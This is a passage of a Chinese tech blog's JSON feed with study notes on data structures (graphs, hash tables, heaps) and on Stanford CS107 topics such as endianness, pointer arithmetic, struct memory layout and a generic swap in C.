xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>N</mi><mn>2</mn></msup></mrow><annotation encoding=\"application/x-tex\">N^2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">N</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span></span> ，其中 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>N</mi></mrow><annotation encoding=\"application/x-tex\">N</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">N</span></span></span></span> 为节点数量。因此，当边数量明显少于节点数量时，使用邻接矩阵存储图会造成较大的内存浪费。<br>\n因此，邻接表 适合存储稀疏图（顶点较多、边较少）； 邻接矩阵 适合存储稠密图（顶点较少、边较多）。</p>\n</blockquote>\n<h2 id=\"散列表\"><a class=\"markdownIt-Anchor\" href=\"#散列表\">#</a> 散列表</h2>\n<p>散列表是一种非线性数据结构，通过利用 Hash 函数将指定的「键  <code>key</code> 」映射至对应的「值  <code>value</code> 」，以实现高效的元素查找。</p>\n<blockquote>\n<p>设想一个简单场景：小力、小特、小扣的学号分别为 10001, 10002, 10003 。<br>\n现需求从「姓名」查找「学号」。</p>\n</blockquote>\n<p>则可通过建立姓名为  <code>key</code>  ，学号为  <code>value</code>  的散列表实现此需求，代码如下：</p>\n<pre><code class=\"language-c++\">// 初始化散列表\nunordered_map&lt;string, int&gt; dic;\n\n// 添加 key -&gt; value 键值对\ndic[&quot;小力&quot;] = 10001;\ndic[&quot;小特&quot;] = 10002;\ndic[&quot;小扣&quot;] = 10003;\n\n// 从姓名查找学号\ndic.find(&quot;小力&quot;)-&gt;second; // -&gt; 10001\ndic.find(&quot;小特&quot;)-&gt;second; // -&gt; 10002\ndic.find(&quot;小扣&quot;)-&gt;second; // -&gt; 10003\n</code></pre>\n<p><img data-src=\"1599811794-ruXMOV-Picture8.png\" alt=\"Picture8.png\"></p>\n<h3 id=\"hash-函数设计示例\"><a class=\"markdownIt-Anchor\" href=\"#hash-函数设计示例\">#</a> Hash 函数设计示例 ：</h3>\n<blockquote>\n<p>假设需求：从「学号」查找「姓名」。</p>\n</blockquote>\n<p>将三人的姓名存储至以下数组中，则各姓名在数组中的索引分别为 0, 1, 2 。</p>\n<pre><code class=\"language-c++\">string names[] = &#123; &quot;小力&quot;, &quot;小特&quot;, &quot;小扣&quot; &#125;;\n</code></pre>\n<p>此时，我们构造一个简单的 Hash 函数（ %% 为取余符号 ），公式和封装函数如下所示：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>h</mi><mi>a</mi><mi>s</mi><mi>h</mi><mo stretchy=\"false\">(</mo><mi>k</mi><mi>e</mi><mi>y</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mo stretchy=\"false\">(</mo><mi>k</mi><mi>e</mi><mi>y</mi><mo>−</mo><mn>1</mn><mo stretchy=\"false\">)</mo><mi mathvariant=\"normal\">%</mi><mn>10000</mn></mrow><annotation encoding=\"application/x-tex\">hash(key)=(key-1)\\%10000\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">h</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">1</span><span class=\"mclose\">)</span><span class=\"mord\">%</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">0</span></span></span></span></span></p>\n<pre><code class=\"language-c++\">int hash(int id)&#123;\n\tint index = (id - 1) % 10000;\n    return index; &#125;\n</code></pre>\n<p>则我们构建了以学号为  <code>key</code>  、姓名对应的数组索引为  <code>value</code>  的散列表。利用此 Hash 函数，则可在 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>O</mi><mo stretchy=\"false\">(</mo><mn>1</mn><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">O(1)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mopen\">(</span><span class=\"mord\">1</span><span class=\"mclose\">)</span></span></span></span> 时间复杂度下通过学号查找到对应姓名，即：</p>\n<pre><code class=\"language-c++\">names[hash(10001)] // 小力\nnames[hash(10002)] // 小特\nnames[hash(10003)] // 小扣\n</code></pre>\n<p><img data-src=\"1599811794-NfbpfW-Picture8-1.png\" alt=\"Picture8-1.png\"></p>\n<p>以上设计只适用于此示例，实际的 Hash 函数需保证低碰撞率、 高鲁棒性等，以适用于各类数据和场景。</p>\n<h2 id=\"堆\"><a class=\"markdownIt-Anchor\" href=\"#堆\">#</a> 堆</h2>\n<p>堆是一种基于「完全二叉树」的数据结构，可使用数组实现。以堆为原理的排序算法称为「堆排序」，基于堆实现的数据结构为「优先队列」。堆分为「大顶堆」和「小顶堆」，大（小）顶堆：任意节点的值不大于（小于）其父节点的值。</p>\n<blockquote>\n<p><strong>完全二叉树定义：</strong> 设二叉树深度为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>k</mi></mrow><annotation encoding=\"application/x-tex\">k</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span></span></span></span> ，若二叉树除第 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>k</mi></mrow><annotation encoding=\"application/x-tex\">k</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span></span></span></span> 层外的其它各层（第 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span></span></span></span> 至 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">k-1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.77777em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span></span></span></span> 层）的节点达到最大个数，且处于第 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>k</mi></mrow><annotation encoding=\"application/x-tex\">k</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span></span></span></span> 层的节点都连续集中在最左边，则称此二叉树为完全二叉树。</p>\n</blockquote>\n<p>如下图所示，为包含  <code>1, 4, 2, 6, 8</code>  元素的小顶堆。将堆（完全二叉树）中的结点按层编号，即可映射到右边的数组存储形式。</p>\n<p><img data-src=\"1599584901-xoiGEQ-Picture9.png\" alt=\"Picture9.png\"></p>\n<p>通过使用「优先队列」的「压入  <code>push()</code> 」和「弹出  <code>pop()</code> 」操作，即可完成堆排序，实现代码如下：</p>\n<pre><code class=\"language-c++\">// 初始化小顶堆\npriority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt; heap;\n\n// 元素入堆\nheap.push(1);\nheap.push(4);\nheap.push(2);\nheap.push(6);\nheap.push(8);\n\n// 元素出堆（从小到大）\nheap.pop(); // -&gt; 1\nheap.pop(); // -&gt; 2\nheap.pop(); // -&gt; 4\nheap.pop(); // -&gt; 6\nheap.pop(); // -&gt; 8\n</code></pre>\n",
            "tags": [
                "C++_Leetcode"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/11/05/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_3/",
            "url": "http://yanagi-kon.github.io/2023/11/05/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_3/",
            "title": "斯坦福编程范式CS107_3",
            "date_published": "2023-11-05T12:28:00.000Z",
            "content_html": "<h1 id=\"斯坦福编程范式cs107_3\"><a class=\"markdownIt-Anchor\" href=\"#斯坦福编程范式cs107_3\">#</a> 斯坦福编程范式 CS107_3</h1>\n<h2 id=\"1大端存储小端存储\"><a class=\"markdownIt-Anchor\" href=\"#1大端存储小端存储\">#</a> 1. 大端存储，小端存储</h2>\n<p>端模式（Endian）的这个词出自 Jonathan Swift 书写的《格列佛游记》。这本书根据将鸡蛋敲开的方法不同将所有的人分为两类，** 从圆头开始将鸡蛋敲开的人被归为 Big Endian，从尖头开始将鸡蛋敲开的人被归为 Littile Endian（这句话最为形象）。** 小人国的内战就源于吃鸡蛋时是究竟从大头（Big-Endian）敲开还是从小头（Little-Endian）敲开。在计算机业 Big Endian 和 Little Endian 也几乎引起一场战争。在计算机业界，Endian 表示数据在存储器中的存放顺序。下文举例说明在计算机中大小端模式的区别。</p>\n<p>如果将一个 32 位的整数 0x12345678 存放到一个整型变量（int）中，这个整型变量采用大端或者小端模式在内存中的存储由下表所示。为简单起见，本文使用 OP0 表示一个 32 位数据的最高字节 MSB（Most Significant Byte），使用 OP3 表示一个 32 位数据最低字节 LSB（Least Significant Byte）。</p>\n<table>\n<thead>\n<tr>\n<th>地址偏移</th>\n<th>大端模式</th>\n<th>小端模式</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0x00</td>\n<td>12（OP0）</td>\n<td>78（OP3）</td>\n</tr>\n<tr>\n<td>0x01</td>\n<td>34（OP1）</td>\n<td>56（OP2）</td>\n</tr>\n<tr>\n<td>0x02</td>\n<td>56（OP2）</td>\n<td>34（OP1）</td>\n</tr>\n<tr>\n<td>0x03</td>\n<td>78（OP3）</td>\n<td>12（OP0）</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>小端： <code>较高的有效字节存放在较高的的存储器地址</code> ， <code>较低的有效字节</code> 存放在 <code>较低的存储器地址</code> 。</li>\n<li>大端： <code>较高的有效字节存放在较低的存储器地址</code> ， <code>较低的有效字节</code> 存放在 <code>较高的存储器地址</code> 。</li>\n</ul>\n<p>采用大小模式对数据进行存放的主要区别在于在存放的字节顺序，大端方式将 <code>高数据位</code> 存放在 <code>低地址</code> ，小端方式将 <code>高数据位</code> 存放在 <code>高地址</code> 。采用大端方式进行数据存放符合人类的正常思维，而采用小端方式进行数据存放利于计算机处理。到目前为止，采用大端或者小端进行数据存放，其孰优孰劣也没有定论。大端与小端模式的差别体现在一个处理器的寄存器，指令集，系统总线等各个层次中。</p>\n<p>用函数判断系统是 Big Endian 还是 Little Endian</p>\n<p>方法一：</p>\n<p>short 类型占用 2 字节， char 类型占用 1 字节</p>\n<pre><code class=\"language-C\">//如果字节序为big-endian，返回true;  \n//反之为   little-endian，返回false  \n\nbool IsBig_Endian()\n&#123;\n    unsigned short test = 0x1234;\n    if(*( (unsigned char*) &amp;test ) == 0x12)\n       return TRUE;\n   else\n       return FALSE;\n&#125;//IsBig_Endian()\n</code></pre>\n<p>方法二：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">checkCPUendian</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\">// 返回 1，为小端；反之，为大端；</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">union</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span>  a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> b<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>c<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    c<span class=\"token punctuation\">.</span>a <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">1</span> <span class=\"token operator\">==</span> c<span class=\"token punctuation\">.</span>b<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li>\n<p>字节序的使用：</p>\n<p>大端模式处理器的字节序到网络字节序不需要转换，此时 ntohs (n)=n，ntohl =n；而小端模式处理器的字节序到网络字节必须要进行转换 (同理，有时候需要将大端字节顺序转换成小端字节顺序，也用这个函数，因为这个函数本来就是用来颠倒字节顺序的)，转换如下：</p>\n</li>\n</ul>\n<pre><code class=\"language-C\">#if defined(BIG_ENDIAN) &amp;&amp; !defined(LITTLE_ENDIAN)\n   #define htons(A)  (A)\n   #define htonl(A)  (A)\n   #define ntohs(A)  (A)\n   #define ntohl(A)  (A)\n\n#elif defined(LITTLE_ENDIAN) &amp;&amp; !defined(BIG_ENDIAN)\n   #define htons(A)  ((((uint16_t)(A) &amp; 0xff00) &gt;&gt; 8 ) | \\\\\n                      (((uint16_t)(A) &amp; 0x00ff) &lt;&lt; 8 ))\n   #define htonl(A)  ((((uint32_t)(A) &amp; 0xff000000) &gt;&gt; 24)  | \\\\\n                      (((uint32_t)(A) &amp; 0x00ff0000) &gt;&gt; 8 )  | \\\\\n                      (((uint32_t)(A) &amp; 0x0000ff00) &lt;&lt; 8 )  | \\\\\n                      (((uint32_t)(A) &amp; 0x000000ff) &lt;&lt; 24))\n   #define ntohs     htons\n   #define ntohl     htohl\n#else\n   #error Either BIG_ENDIAN or LITTLE_ENDIAN must be #defined, but not both.\n#endif\n</code></pre>\n<h2 id=\"2关于数组\"><a class=\"markdownIt-Anchor\" href=\"#2关于数组\">#</a> 2. 关于数组</h2>\n<h3 id=\"例子一\"><a class=\"markdownIt-Anchor\" href=\"#例子一\">#</a> 例子一</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> array<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>array 等价于 &amp;array [0]</p>\n<p>array + k 等价于 &amp;array [k]</p>\n<p>*array 等价于 array [0]</p>\n<p>*(array + k) 等价于 array [k]</p>\n<h3 id=\"例子二\"><a class=\"markdownIt-Anchor\" href=\"#例子二\">#</a> 例子二</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>arr<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">128</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">short</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>cout <span class=\"token operator\">&lt;&lt;</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这个时候打印出来的不是 128，而是 512 + 128，这个时候在 arr [3] 中的内容为：</p>\n<p>00000000 00000010 128 = 512 + 128 （这里在课上应该是采用的小端方法）</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">short</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>arr<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">100</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"3关于struct\"><a class=\"markdownIt-Anchor\" href=\"#3关于struct\">#</a> 3. 关于 Struct</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">student</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">char</span> suid<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">int</span> numUnits<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>student pupils<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>pupils<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>numUnits <span class=\"token operator\">=</span> <span class=\"token number\">21</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>pupils<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> <span class=\"token function\">strdup</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Adam\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//strdup 是内存复制的缩写，动态地分配足够的空间来存储字符串</span></pre></td></tr></table></figure><p><img data-src=\"image-20231102162141584.png\" alt=\"image-20231102162141584\"></p>\n<p>进行如下操作后，内存中的情况如下图所示</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pupils<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> pupils<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>suid <span class=\"token operator\">+</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"image-20231102162918438.png\" alt=\"image-20231102162918438\"></p>\n<p>继续进行如下操作</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>pupils<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>suid<span class=\"token punctuation\">,</span><span class=\"token string\">\"40415xx\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"image-20231102163240269.png\" alt=\"image-20231102163240269\"></p>\n<p>继续进行如下操作</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>pupils<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span><span class=\"token string\">\"123456\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"image-20231102163922391.png\" alt=\"image-20231102163922391\"></p>\n<p>这样就会导致 student [0] 的 numUnits 会是一个非常大的数，但是 pupils [3].name 还是正常的 123456.</p>\n<p>继续进行如下操作</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pupils<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>suid<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token char\">'A'</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"4高级函数\"><a class=\"markdownIt-Anchor\" href=\"#4高级函数\">#</a> 4. 高级函数？</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">swap</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>ap<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>bp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">int</span> temp <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>ap<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token operator\">*</span>ap <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>bp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token operator\">*</span>bp <span class=\"token operator\">=</span> temp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">int</span> x <span class=\"token operator\">=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">int</span> y <span class=\"token operator\">=</span> <span class=\"token number\">117</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">swap</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>x<span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure>",
            "tags": [
                "斯坦福编程范式CS107"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/11/05/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_4/",
            "url": "http://yanagi-kon.github.io/2023/11/05/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_4/",
            "title": "斯坦福编程范式CS107_4",
            "date_published": "2023-11-05T12:28:00.000Z",
            "content_html": "<h1 id=\"斯坦福编程范式cs107_4\"><a class=\"markdownIt-Anchor\" href=\"#斯坦福编程范式cs107_4\">#</a> 斯坦福编程范式 CS107_4</h1>\n<h2 id=\"使用c做出类似c中模板的效果\"><a class=\"markdownIt-Anchor\" href=\"#使用c做出类似c中模板的效果\">#</a> 使用 C 做出类似 C++ 中模板的效果</h2>\n<p>还是第三节中的交换函数，因为中间变量 temp 被声明为 int，所以系统就隐式默认这个在进行 4 字节的复制，所以我们不可能使用之前的函数进行 double 类型或者其他类型变量的交换。我们可以通过通用的指针类型 void * 来达到不提前限制类型的效果，它说明指向没有任何类型信息的某些东西。</p>\n<p>但如果你按照下述内容进行编码运行，就会出现问题</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">swap</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>vp1<span class=\"token punctuation\">,</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>vp2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">void</span> temp <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>vp1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token operator\">*</span>vp1 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>vp2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token operator\">*</span>vp2 <span class=\"token operator\">=</span> temp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>首先，void temp 会报错，因为不能将变量定义为 void 类型。其次，不能对 void * 进行解引用，因为机器不知道要取出来多少字节来作为操作的一部分。因此我们还需要第三个参数，大小 size。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">swap</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>vp1<span class=\"token punctuation\">,</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>vp2<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span>size<span class=\"token punctuation\">]</span><span class=\"token 